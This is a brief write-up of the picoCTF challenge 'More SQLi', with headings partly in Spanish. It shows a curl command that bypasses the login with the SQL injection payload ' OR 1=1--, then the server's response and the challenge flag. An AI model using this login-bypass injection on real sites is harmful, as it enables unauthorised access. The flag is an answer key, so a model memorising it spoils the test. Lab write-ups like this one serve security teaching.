# More SQLi
# Descripción del reto:
Can you find the flag on this website. Try to find the flag here. http://saturn.picoctf.net:64782/
# Solución:
curl -s -X POST http://saturn.picoctf.net:64782/ -d "username=admin" -d "password=' OR 1=1--" | grep "picoCTF"
<h1>Logged in!.</h1><p>Your flag is: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}</p>

'picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}'
# Notas adicionales
# Referencias